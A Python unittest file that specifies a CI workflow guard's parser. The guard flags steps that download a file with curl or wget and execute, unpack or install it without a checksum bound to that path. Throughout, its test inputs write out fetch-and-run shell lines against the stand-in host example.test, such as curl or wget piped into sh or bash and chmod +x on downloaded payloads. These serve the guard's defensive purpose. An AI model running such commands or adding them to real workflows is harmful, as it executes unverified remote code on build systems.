"""#1647 (ARC-F2C): the fetch-and-exec guard's parser, on its own.

The #1529 control -- "no workflow may run a binary it fetched without checking
what arrived" -- was a pair of regexes living in `tests/test_workflow_pins.py`,
and run-13 found both of them failing OPEN:

* the fetch pattern required a whitespace-separated short `-o`/`-O` flag and
  excluded pipe characters, so `curl -fsSL https://... | sh` and
  `wget -qO- ... | bash` produced an EMPTY fetch set -- not "unverified", not
  seen as a download at all -- and `--output` was equally invisible; and
* "verified" was any `sha256sum`/`shasum` with `-c` anywhere earlier in the
  step, bound to no path and no digest, so an unrelated checksum of one
  artifact cleared a later unverified `curl -o payload; chmod +x payload`.

A guard over shell text that cannot read the shell reports a clean pass on
every form its regex does not parse, which is the worst answer a control can
give. So the logic moved into `scripts/workflow_guard.py` -- a small, real
parser: statements split quote-aware on `;`, `&&`, `||`, `|` and newlines,
argv from `shlex`, heredocs and continuations joined first -- and this module
is its specification. Every case below returned None ("clean") from the regex
it replaces; the ones marked BASE-CLEAN are the exact forms run-13 named.

The repo-wide application of the rule (every `run:` step in
`.github/workflows/*.yml`, plus the exemption list) stays in
`tests/test_workflow_pins.py`, beside the sibling rules it shares a posture
check with.
"""
import os
import re
import tempfile
import unittest
from unittest import mock

import shell_reader
import workflow_forms
import workflow_gating
import workflow_guard as wg
import workflow_options
import workflow_programs
# The download shape itself lives in the layer below the rule (#1697).
from workflow_forms import Fetch

HEX = "a" * 64
OTHER_HEX = "b" * 64


class TestFetchParsing(unittest.TestCase):
    """What the parser SEES. Each form is a way to spell the same act."""

    def one(self, script):
        found = wg.fetches(script)
        self.assertEqual(1, len(found), "expected exactly one fetch in %r, got %r"
                         % (script, found))
        return found[0]

    def test_short_output_flag(self):
        self.assertEqual(
            Fetch("curl", "https://example.test/a", "/tmp/a", None),
            self.one("curl -sfL https://example.test/a -o /tmp/a\n"))

    def test_attached_short_output_flag(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -o/tmp/a https://example.test/a\n").dest)

    def test_clustered_short_flags(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -sfLo /tmp/a https://example.test/a\n").dest)

    def test_long_output_flag_is_seen(self):
        # BASE-CLEAN: the old regex required a short `-o`/`-O`.
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL --output /tmp/a https://example.test/a\n").dest)

    def test_long_output_flag_with_an_equals_is_seen(self):
        # BASE-CLEAN.
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL --output=/tmp/a https://example.test/a\n").dest)

    def test_curl_remote_name_writes_the_url_basename(self):
        self.assertEqual("payload.sh",
                         self.one("curl -fsSLO https://example.test/d/payload.sh\n").dest)

    def test_curl_without_an_output_flag_is_stdout(self):
        # BASE-CLEAN: the whole pipeline form. dest is None -- there is no file.
        self.assertEqual(
            Fetch("curl", "https://example.test/i.sh", None, ("sh",)),
            self.one("curl -fsSL https://example.test/i.sh | sh\n"))

    def test_wget_writes_the_url_basename_by_default(self):
        self.assertEqual("payload",
                         self.one("wget https://example.test/payload\n").dest)

    def test_wget_output_document(self):
        for script in ("wget -O /tmp/a https://example.test/a\n",
                       "wget --output-document /tmp/a https://example.test/a\n",
                       "wget --output-document=/tmp/a https://example.test/a\n"):
            self.assertEqual("/tmp/a", self.one(script).dest, script)

    def test_wget_dash_O_dash_is_stdout(self):
        # BASE-CLEAN: `wget -qO- ... | bash`, the second form run-13 named.
        self.assertEqual(
            Fetch("wget", "https://example.test/i.sh", None, ("bash",)),
            self.one("wget -qO- https://example.test/i.sh | bash\n"))

    def test_wgets_lowercase_o_is_a_LOG_file_not_the_destination(self):
        # curl's `-o` and wget's `-o` are different options; one parser that
        # treats them alike writes the log path into the guard's dest field.
        fetch = self.one("wget -o /tmp/wget.log https://example.test/payload\n")
        self.assertEqual("payload", fetch.dest)

    def test_a_redirect_is_a_destination(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL https://example.test/a > /tmp/a\n").dest)

    def test_a_fetch_anywhere_in_a_pipeline_is_seen(self):
        self.assertEqual("/tmp/a",
                         self.one("echo go | curl -fsSL https://example.test/a -o /tmp/a\n").dest)

    def test_the_piped_stage_is_recorded_as_argv(self):
        self.assertEqual(("python3", "-"),
                         self.one("curl -fsSL https://example.test/i.py | python3 -\n").piped_to)

    def test_continuations_are_joined(self):
        script = ("curl -sfL --connect-timeout 5 --max-time 60 --retry 3 \\\n"
                  "  -o /tmp/hadolint \\\n"
                  "  https://example.test/hadolint-Linux-x86_64\n")
        self.assertEqual(
            Fetch("curl", "https://example.test/hadolint-Linux-x86_64",
                  "/tmp/hadolint", None),
            self.one(script))

    def test_a_quoted_url_keeps_its_variable_expansions(self):
        fetch = self.one('curl -sfL "https://example.test/v${VERSION}/x" -o /tmp/x\n')
        self.assertEqual("https://example.test/v${VERSION}/x", fetch.url)

    def test_two_fetches_in_one_step_are_both_seen(self):
        found = wg.fetches("curl -fsSL https://example.test/a -o /tmp/a\n"
                           "wget -O /tmp/b https://example.test/b\n")
        self.assertEqual(["/tmp/a", "/tmp/b"], [f.dest for f in found])

    def test_a_commented_out_fetch_is_not_a_fetch(self):
        # Half this repo's workflow prose QUOTES the command it explains; a
        # guard that reads its own documentation as an act flags the comment.
        self.assertEqual([], wg.fetches("# curl -fsSL https://example.test/x | sh\n"
                                        "make test   # not curl -o /tmp/x\n"))

    def test_a_script_with_no_fetch_has_none(self):
        self.assertEqual([], wg.fetches("make test\nchmod +x ./run.sh\n"))


class TestStderrRedirectsAreNotTheDestination(unittest.TestCase):
    """#1733 (COD-C2C): `stage.writes[-1]` used to overwrite a correctly
    parsed `-o`/`-O` destination with whatever a trailing `2>&1` or
    `2>/dev/null` happened to file as a write, so an ordinary stderr redirect
    on a fetch line silently defeated the guard. `shell_reader`'s own spec for
    the parser change is in tests/test_shell_reader.py; these are the
    guard-level shapes the issue named."""

    def one(self, script):
        found = wg.fetches(script)
        self.assertEqual(1, len(found), "expected exactly one fetch in %r, got %r"
                         % (script, found))
        return found[0]

    def test_a_stderr_redirect_after_the_output_flag_does_not_replace_the_dest(self):
        fetch = self.one(
            "curl -fsSL https://example.test/install.sh -o /tmp/i.sh 2>/dev/null\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_still_caught_end_to_end(self):
        script = ("curl -fsSL https://example.test/install.sh -o /tmp/i.sh "
                  "2>/dev/null && bash /tmp/i.sh\n")
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_fd_duplication_after_the_output_flag_does_not_replace_the_dest(self):
        fetch = self.one(
            "curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | tee log\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_still_caught_end_to_end_too(self):
        script = ("curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | "
                  "tee log && sh /tmp/i.sh\n")
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_stdout_redirect_followed_by_a_stderr_dup_still_names_the_file(self):
        fetch = self.one("curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_caught_end_to_end_with_a_semicolon(self):
        script = "curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1; sh /tmp/i.sh\n"
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_bare_fd_dup_with_no_output_flag_stays_stdout(self):
        # No file at all -- the destination stays what it always was
        # (stdout), not the literal `&2`.
        fetch = self.one("curl -fsSL https://example.test/i.sh >&2\n")
        self.assertIsNone(fetch.dest)

    def test_that_shape_stays_clean_with_no_pipe(self):
        # Regression guard: nothing landed on disk and nothing consumed the
        # stream, so this is not the rule's business, same as before #1733.
        self.assertIsNone(
            wg.fetch_exec_defect("curl -fsSL https://example.test/i.sh >&2\n"))

    def test_wget_piped_to_sh_with_a_stderr_redirect_is_still_caught(self):
        # The headline pipe-to-shell shape must survive the fix untouched.
        script = "wget -qO- https://example.test/i.sh 2>/dev/null | sh\n"
        fetch = self.one(script)
        self.assertIsNone(fetch.dest)
        self.assertEqual(("sh",), fetch.piped_to)
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("sh", why)

    def test_a_stderr_redirect_with_no_output_flag_does_not_become_the_dest(self):
        fetch = self.one("curl -fsSL https://example.test/i.sh 2>err.log\n")
        self.assertIsNone(fetch.dest)

    def test_combined_stream_redirects_are_a_real_destination(self):
        # Round 1 fix (opus review on 435e6f6): `&>word` / `&>>word` /
        # unnumbered `>&word` (attached or spaced) are bash's `>word 2>&1`
        # shorthand -- a REAL destination, caught the same as an explicit
        # `-o`. At the reviewed head every one of these five reported clean.
        for script in (
            "curl -fsSL https://example.test/i.sh &>/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh &> /tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh &>>/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh >&/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh >& /tmp/i.sh\n",
        ):
            fetch = self.one(script)
            self.assertEqual("/tmp/i.sh", fetch.dest, script)
            why = wg.fetch_exec_defect(script + "sh /tmp/i.sh\n")
            self.assertIsNotNone(why, script)
            self.assertIn("/tmp/i.sh", why, script)

    def test_the_exact_reported_reproduction_is_caught(self):
        why = wg.fetch_exec_defect(
            "curl https://example.test/i.sh &> /tmp/i.sh && sh /tmp/i.sh\n")
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_stdout_redirect_to_dev_stderr_still_means_nothing_was_written(self):
        # NIT fix (round 1): `/dev/stderr` means "nothing was written" only
        # when a STDOUT REDIRECT landed there.
        fetch = self.one("curl -fsSL https://example.test/i.sh > /dev/stderr\n")
        self.assertIsNone(fetch.dest)

    def test_an_explicit_dest_of_dev_stderr_is_still_caught(self):
        # NIT fix (round 1): unlike a redirect, `-o /dev/stderr` really did
        # write there -- reverting the STDOUT-tuple shortcut must not also
        # silence this, which was caught before #1733 touched STDOUT.
        fetch = self.one("curl -fsSL https://example.test/i.sh -o /dev/stderr\n")
        self.assertEqual("/dev/stderr", fetch.dest)
        why = wg.fetch_exec_defect(
            "curl -fsSL https://example.test/i.sh -o /dev/stderr\nsh /dev/stderr\n")
        self.assertIsNotNone(why)


class TestVerificationBinding(unittest.TestCase):
    """What the parser ACCEPTS: a checksum bound to the fetched path, run
    before the bytes are used. Everything else is theatre."""

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    EXEC = "chmod +x /tmp/payload\n"

    def test_a_pipeline_into_a_shell_is_always_unverified(self):
        # BASE-CLEAN. There is no file to hash, so no checksum can rescue it.
        why = wg.fetch_exec_defect("curl -fsSL https://example.test/i.sh | sh\n")
        self.assertIn("https://example.test/i.sh", why)
        self.assertIn("sh", why)

    def test_a_checksum_cannot_rescue_a_pipeline(self):
        script = ('echo "%s  /tmp/x" | sha256sum -c -\n' % HEX +
                  "curl -fsSL https://example.test/i.sh | bash\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_wget_piped_into_bash_is_unverified(self):
        # BASE-CLEAN.
        self.assertIsNotNone(
            wg.fetch_exec_defect("wget -qO- https://example.test/i.sh | bash\n"))

    def test_a_bound_checksum_clears_it(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_checksum_naming_another_file_verifies_nothing(self):
        # BASE-CLEAN: the unbound-checksum half of #1647.
        script = (self.FETCH +
                  'echo "%s  /tmp/other" | sha256sum -c -\n' % OTHER_HEX +
                  self.EXEC)
        why = wg.fetch_exec_defect(script)
        self.assertIn("/tmp/payload", why)

    def test_an_earlier_checksum_of_a_different_download_does_not_clear_it(self):
        # BASE-CLEAN, and the exploit run-13 wrote out: one verified artifact
        # in the step used to clear every later one.
        script = ("curl -sfL https://example.test/tool -o /tmp/tool\n"
                  'echo "%s  /tmp/tool" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/tool\n" + self.FETCH + self.EXEC)
        why = wg.fetch_exec_defect(script)
        self.assertIn("/tmp/payload", why)
        self.assertNotIn("/tmp/tool", why)

    def test_a_checksum_after_the_chmod_is_still_a_defect(self):
        script = (self.FETCH + self.EXEC +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
        self.assertIn("only AFTER", wg.fetch_exec_defect(script))

    def test_a_sums_file_the_step_wrote_counts(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
                  "sha256sum -c /tmp/sums\n" + self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_heredoc_sums_list_counts(self):
        script = (self.FETCH +
                  "sha256sum -c <<EOF\n%s  /tmp/payload\nEOF\n" % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_sums_file_naming_another_download_does_not_count(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/other" > /tmp/sums\n' % OTHER_HEX +
                  "sha256sum -c /tmp/sums\n" + self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_sums_file_the_step_never_wrote_does_not_count(self):
        # Nothing in the step ties that file to this download; it may not even
        # exist, and `sha256sum -c` on an absent list is the caller's problem.
        script = self.FETCH + "sha256sum -c /tmp/sums\n" + self.EXEC
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_shasum_a_256_counts(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" | shasum -a 256 -c -\n' % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_check_carrying_no_digest_verifies_nothing(self):
        # Naming the file is not checking it: something has to be the expected
        # digest, whether a literal or the pinned variable holding one.
        script = (self.FETCH + 'echo "/tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_pinned_digest_variable_counts_as_the_digest(self):
        script = (self.FETCH +
                  'echo "${PAYLOAD_SHA256}  /tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_basename_match_from_another_directory_verifies_nothing(self):
        # M1: a sums list may carry bare names, but only for a bare name. With
        # a directory in the dest, `x.sh` is a DIFFERENT file, and accepting it
        # is the unbound-checksum defect wearing a shorter path.
        script = ("curl -sfL https://example.test/x.sh -o /tmp/evil/x.sh\n"
                  'echo "%s  x.sh" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/evil/x.sh\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_bare_name_still_matches_its_own_basename(self):
        script = ("curl -sfL https://example.test/x.sh -O\n"
                  'echo "%s  x.sh" | sha256sum -c -\n' % HEX +
                  "chmod +x x.sh\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_variable_that_is_not_a_digest_is_not_a_digest(self):
        # L3: `$FILE` is a path, `$SHA256` is an expectation. Accepting any
        # expansion made `echo "$FILE  /tmp/payload" | sha256sum -c -` a check.
        script = (self.FETCH + 'echo "$FILE  /tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_the_late_checksum_message_names_the_fetch_and_the_remedy(self):
        # L4: "verifies X only AFTER Y" said what was wrong and not what to do.
        script = (self.FETCH + self.EXEC +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
        why = wg.fetch_exec_defect(script)
        self.assertIn("only AFTER", why)
        self.assertIn("https://example.test/payload", why)
        self.assertIn("sha256sum -c", why)

    def test_the_message_says_what_would_satisfy_the_guard(self):
        why = wg.fetch_exec_defect(self.FETCH + self.EXEC)
        self.assertIn("sha256sum -c", why)
        self.assertIn("/tmp/payload", why)


class TestWhatCountsAsExecuting(unittest.TestCase):
    """The uses that turn fetched bytes into behaviour."""

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"

    def use(self, line):
        return wg.fetch_exec_defect(self.FETCH + line)

    def test_chmod_plus_x(self):
        self.assertIsNotNone(self.use("chmod +x /tmp/payload\n"))

    def test_running_the_file_directly(self):
        self.assertIsNotNone(self.use("/tmp/payload --version\n"))

    def test_running_it_through_an_interpreter(self):
        self.assertIsNotNone(self.use("python3 /tmp/payload\n"))

    def test_unpacking_it_with_tar(self):
        self.assertIsNotNone(self.use("tar -xzf /tmp/payload\n"))

    def test_unpacking_it_with_unzip(self):
        self.assertIsNotNone(self.use("unzip -q /tmp/payload\n"))

    def test_installing_it(self):
        self.assertIsNotNone(self.use("install -m 0755 /tmp/payload /usr/local/bin/p\n"))

    def test_moving_it_onto_PATH(self):
        self.assertIsNotNone(self.use("sudo mv /tmp/payload /usr/local/bin/payload\n"))

    def test_catting_it_into_a_shell(self):
        self.assertIsNotNone(self.use("cat /tmp/payload | sh\n"))

    def test_an_interpreter_reading_it_from_stdin(self):
        # M3: `bash < x.sh` runs x.sh. The file is never an argument, so a
        # guard that reads argv only sees `bash` with nothing after it.
        for line in ("bash < /tmp/payload\n",
                     "sh -s -- --yes < /tmp/payload\n",
                     "python3 < /tmp/payload\n"):
            self.assertIsNotNone(self.use(line), line)

    def test_running_a_copy_of_it_under_another_name(self):
        # M2: renaming laundered the file -- the copy branch only fired for a
        # destination on PATH, so `cp x y; ./y` ran unverified bytes under a
        # name the guard had never heard of.
        for copy in ("cp /tmp/payload /tmp/alias\n",
                     "mv /tmp/payload /tmp/alias\n",
                     "ln -s /tmp/payload /tmp/alias\n",
                     "cat /tmp/payload > /tmp/alias\n"):
            why = self.use(copy + "chmod +x /tmp/alias\n/tmp/alias\n")
            self.assertIsNotNone(why, copy)

    def test_symlinking_it_onto_PATH(self):
        # The alias is then invoked by a bare name this script never mentions.
        self.assertIsNotNone(self.use("ln -s /tmp/payload /usr/local/bin/p\n"))

    def test_a_checksum_naming_the_alias_clears_it(self):
        script = (self.FETCH + "cp /tmp/payload /tmp/alias\n" +
                  'echo "%s  /tmp/alias" | sha256sum -c -\n' % ("a" * 64) +
                  "chmod +x /tmp/alias\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_copying_a_data_file_is_not_executing_it(self):
        script = ("curl -sfL https://example.test/d.json -o /tmp/d.json\n"
                  "cp /tmp/d.json /tmp/copy.json\njq . /tmp/copy.json\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_that_is_never_executed_is_left_alone(self):
        script = ("curl -sfL https://example.test/data.json -o /tmp/d.json\n"
                  "jq . /tmp/d.json\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_download_piped_to_a_reader_is_left_alone(self):
        self.assertIsNone(
            wg.fetch_exec_defect("curl -fsSL https://example.test/k.gpg | gpg --import\n"))

    def test_a_script_with_no_fetch_is_left_alone(self):
        self.assertIsNone(wg.fetch_exec_defect("make test\nchmod +x ./run.sh\n"))

    def test_executing_a_file_this_step_never_fetched_is_not_this_rules_business(self):
        self.assertIsNone(wg.fetch_exec_defect("chmod +x ./scripts/local.sh\n"
                                               "./scripts/local.sh\n"))


class TestADownloadNamedLikeAWrapper(unittest.TestCase):
    """#2227: the reader knows a wrapper by its basename and reads through it,
    so a download called `flock`, run as `./flock 9`, came out as the `flock`
    wrapper running nothing, and only what the reader left was compared with
    the download. Each word read as a wrapper is compared with the downloads
    too, as the command word is, and is still read through."""

    URL = "https://example.test/tool"

    def test_a_download_run_as_a_wrapper_is_running_it(self):
        url = self.URL
        for script in (
                # FLAGGED on main, where `flock` and `setsid` were not wrappers yet.
                f"touch flock && chmod +x flock && curl -fsSL -o flock {url} && ./flock 9\n",
                f"curl -fsSL -o /tmp/flock {url}\n/tmp/flock 9\n",
                f"curl -fsSL -o bin/flock {url}\nbin/flock -n /tmp/lock make build\n",
                f"curl -fsSL -o setsid {url}\nsudo ./setsid true\n",
                # An older wrapper name, CLEAN on main, and one reached through a copy.
                f"curl -fsSL -o env {url}\n./env FOO=1 make build\n",
                f"curl -fsSL -o /tmp/payload {url}\ncp /tmp/payload ./nohup\n./nohup make\n",
                # A bare name, compared as a bare `tool` is: with `.` on PATH it runs the download.
                f"curl -fsSL -o flock {url}\nPATH=.:$PATH flock 9\n"):
            with self.subTest(script=script):
                self.assertIn("running it", wg.fetch_exec_defect(script) or "")

    def test_a_wrapper_word_naming_another_file_is_not_the_download(self):
        # The same name is not the same file: `/usr/bin/env` is not ./env, and
        # ./flock is not /tmp/flock.
        for script in (f"curl -fsSL -o env {self.URL}\n/usr/bin/env FOO=1 make\n",
                       f"curl -fsSL -o /tmp/flock {self.URL}\n./flock 9\n"):
            with self.subTest(script=script):
                self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_dynamic_path_to_a_download_behind_a_wrapper_is_reported(self):
        # Main refused `$PWD/flock` behind `sudo`, as it refuses `sudo "$X"`:
        # reading it as the `flock` wrapper by its last word read it clean.
        # The older names get the same refusal now (`$PWD/env` runs the
        # download as root here), which is the cost the rule accepts.
        for script in (f'curl -fsSL -o flock {self.URL}\nsudo "$PWD/flock" 9\n',
                       f'curl -fsSL -o env {self.URL}\nsudo "$PWD/env" FOO=1 make\n'):
            with self.subTest(script=script):
                self.assertIn("dynamic command operand behind a wrapper",
                              wg.fetch_exec_defect(script) or "")

    def test_a_dynamic_word_behind_a_wrapper_is_unresolved_whatever_its_name(self):
        argv = shell_reader.statements('sudo "$PWD/chrt" 10 make')[0].stages[0].argv
        self.assertIn("dynamic command operand behind a wrapper",
                      shell_reader.unresolved_wrapper(argv) or "")
        self.assertIn("cannot read command behind wrapper",
                      wg.fetch_exec_defect('sudo "$PWD/chrt" 10 make\n') or "")

    def test_a_download_under_any_other_name_is_running_it_as_before(self):
        script = f"touch tool && chmod +x tool && curl -fsSL -o tool {self.URL} && ./tool 9\n"
        self.assertIn("running it", wg.fetch_exec_defect(script) or "")

    def test_a_copied_system_wrapper_is_still_read_through(self):
        # Nothing fetched ./env, so reading through it is what finds the fetch
        # it runs: taking `./env` for a plain file would read this step clean.
        script = f"cp /usr/bin/env ./env\n./env sh -c 'curl -fsSL {self.URL} | sh'\n"
        self.assertIn("straight to `sh`", wg.fetch_exec_defect(script) or "")

    def test_a_wrapper_with_nothing_fetched_reads_as_before(self):
        self.assertEqual([], shell_reader.command(["flock", "9"]))
        self.assertIsNone(shell_reader.unresolved_wrapper(["flock", "9"]))
        self.assertIsNone(wg.fetch_exec_defect("flock 9\n./flock 9\n"))


class TestADownloadRunThroughAnExpandedPath(unittest.TestCase):
    """#2310: `curl -o tool …; "$PWD/tool" 9` read clean, because a use is
    bound to a download by its spelling and the fetch spelled it `tool`; bash
    3.2 and 5.2 run the download through each spelling in the first test (a
    `chmod +x tool` before the fetch survives it). A command word holding a
    `$` or `$(...)` that ends in a download's basename is now running it."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def defect(self, run, dest="tool"):
        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))

    def test_a_command_word_ending_in_its_basename_is_running_it(self):
        for run in ('"$PWD/tool" 9\n', '"${PWD}/tool" 9\n', "$PWD/tool 9\n",
                    '"$PWD"/tool 9\n', '"$(pwd)/tool" 9\n', '"`pwd`/tool" 9\n',
                    '"$(dirname "$PWD/x")/tool" 9\n', "x=1 $PWD/tool 9\n",
                    'for i in 1; do "$PWD/tool" 9; done\n',
                    'find . -name tool -exec "$PWD/tool" {} \\;\n'):
            with self.subTest(run=run):
                self.assertIn("-> tool and running it with nothing verifying",
                              self.defect(run) or "")

    def test_wherever_the_fetch_put_it(self):
        # Bound by the basename: what `$PWD` expands to is not evaluated, so
        # `d/tool` is read as run too -- which bash does not do from the
        # checkout, and is the fail-closed side to be wrong on.
        for dest, run in (("bin/tool", '"$PWD/bin/tool" 9\n'),
                          ("/tmp/tool", '"$RUNNER_TEMP/tool" 9\n'),
                          ("d/tool", '"$PWD/tool" 9\n')):
            with self.subTest(dest=dest):
                self.assertIn("running it", self.defect(run, dest) or "")

    def test_as_a_wrapper_word_through_a_copy_and_behind_a_wrapper(self):
        # `"$PWD/flock"` is read through as `flock`, but runs the download.
        self.assertIn("running it", self.defect('"$PWD/flock" 9 true\n', "flock") or "")
        self.assertIn("running it (as `alias`, copied from it earlier)",
                      self.defect('cp tool alias\n"$PWD/alias" 9\n') or "")
        # Refused behind `sudo` already; now it is the download's use as well.
        why = wg.fetch_exec_defects("curl -fsSL -o tool %s\nsudo \"$PWD/tool\" 9\n" % self.URL)
        self.assertEqual(2, len(why), why)
        self.assertIn("dynamic command operand behind a wrapper", why[0])
        self.assertIn("running it", why[1])

    def test_a_check_before_it_clears_it_and_one_after_it_does_not(self):
        self.assertIsNone(self.defect(self.CHECK % "tool" + '"$PWD/tool" 9\n'))
        self.assertIn("only AFTER running it",
                      self.defect('"$PWD/tool" 9\n' + self.CHECK % "tool") or "")

    def test_a_check_still_binds_by_its_exact_spelling(self):
        # Reported although bash checks the same file: read that loosely, a
        # checksum of `$OTHER/tool` would clear a `./tool` it never read.
        self.assertIn("no checksum in the job names tool",
                      self.defect(self.CHECK % "$PWD/tool" + '"$PWD/tool" 9\n') or "")

    def test_another_basename_or_a_static_path_is_not_the_download(self):
        for run in ('"$PWD/other" 9\n', '"$PWD/tool.sh" 9\n', '"$PWD/tool/.." 9\n',
                    "./bin/tool 9\n", "/usr/bin/tool 9\n"):
            with self.subTest(run=run):
                self.assertIsNone(self.defect(run))


class TestADownloadWrittenIntoADirectoryOnPath(unittest.TestCase):
    """#2308: `curl -o /usr/local/bin/tool …; tool --version` read clean: the
    download is bound to its path, and `tool` is not that path, but bash finds
    the file by looking the bare name up on PATH. A bare name that is the
    basename of a download written into one of `workflow_operands.PATH_DIRS` is
    now running it -- as the command or as a wrapper word, still read
    through."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def defect(self, dest, run):
        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))

    def test_a_bare_name_runs_a_download_in_a_directory_on_path(self):
        for dest in ("/usr/local/bin/tool", "/usr/bin/tool", "/bin/tool",
                     "/usr/local/sbin/tool", '"$HOME/.local/bin/tool"',
                     '"${HOME}/.local/bin/tool"', "~/.local/bin/tool",
                     "/usr/local/bin/./tool",
                     # review N-4: the runner's `~/.local/bin`, spelled out
                     "/home/runner/.local/bin/tool",
                     # not on a hosted runner's PATH, and kept: fail-closed
                     "/opt/bin/tool"):
            with self.subTest(dest=dest):
                self.assertIn("running it with nothing verifying",
                              self.defect(dest, "tool --version\n") or "")
        script = "curl -fsSL --output-dir /usr/local/bin -O %s\ntool\n" % self.URL
        self.assertIn("-> /usr/local/bin/tool and running it", wg.fetch_exec_defect(script) or "")

    def test_behind_a_wrapper_and_as_one(self):
        for dest, run in (("/usr/local/bin/tool", "sudo tool --version\n"),
                          ("/usr/local/bin/tool", "env FOO=1 tool\n"),
                          ("/usr/local/bin/flock", "flock 9 make\n"),
                          ("/usr/local/bin/env", "env FOO=1 make\n")):
            with self.subTest(dest=dest, run=run):
                self.assertIn("running it", self.defect(dest, run) or "")
        # Still read through: the command behind the wrapper word is `make`.
        self.assertEqual(["make"], shell_reader.command(["flock", "9", "make"]))

    def test_a_check_binds_by_the_path_and_not_by_the_bare_name(self):
        self.assertIsNone(self.defect("/usr/local/bin/tool",
                                      self.CHECK % "/usr/local/bin/tool" + "tool\n"))
        # `sha256sum -c` of the bare `tool` reads ./tool: taking it for the
        # download would clear bytes nothing checked.
        self.assertIn("no checksum in the job names /usr/local/bin/tool",
                      self.defect("/usr/local/bin/tool", self.CHECK % "tool" + "tool\n") or "")

    def test_off_path_or_run_by_a_path_it_is_not_the_bare_name(self):
        for dest, run in (("/tmp/tool", "tool\n"), ("bin/tool", "tool\n"),
                          ("/opt/tool/bin/tool", "tool\n"),
                          ("/usr/local/bin/tool", "./tool\n"),
                          ("/usr/local/bin/tool", "tools\n"),
                          ("/usr/local/bin/tool", "echo tool\n")):
            with self.subTest(dest=dest, run=run):
                self.assertIsNone(self.defect(dest, run))


class TestAGlobSpelledWithADotSlashIsAUseOfTheDownload(unittest.TestCase):
    """#2339: after `curl -o cuda_1.run`, `chmod +x ./cuda_*.run` and `sh
    ./cuda_*.run` read clean where `cuda_*.run` did not, and bash 3.2 and 5.2
    make the download executable and run it. `covers` matches a glob with a
    leading `./` dropped on both sides (#2349, re-review N-C), which closed
    it; these pin it: the `chmod` and the `sh` spellings, with and without a
    checksum that names the file, and a glob that cannot match."""

    GET = "curl -fsSLo %s https://example.test/cuda_1.run\n"
    CHECK = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)

    def job(self, dest, use):
        return [why for _n, why in wg.job_defects([("step", self.GET % dest + use)])]

    def test_either_spelling_of_the_glob_makes_it_executable_or_runs_it(self):
        for dest in ("cuda_1.run", "./cuda_1.run"):
            for use, how in (("chmod +x ./cuda_*.run\n", "making it executable"),
                             ("sh ./cuda_*.run\n", "running it under `sh`"),
                             ("chmod +x cuda_*.run\n", "making it executable"),
                             ("sh cuda_*.run\n", "running it under `sh`"),
                             ("chmod +x ./cuda_1.run\n", "making it executable"),
                             ("sh ./cuda_1.run\n", "running it under `sh`")):
                with self.subTest(dest=dest, use=use):
                    why = self.job(dest, use)
                    self.assertEqual(1, len(why), why)
                    self.assertIn("-> %s and %s with nothing verifying" % (dest, how), why[0])

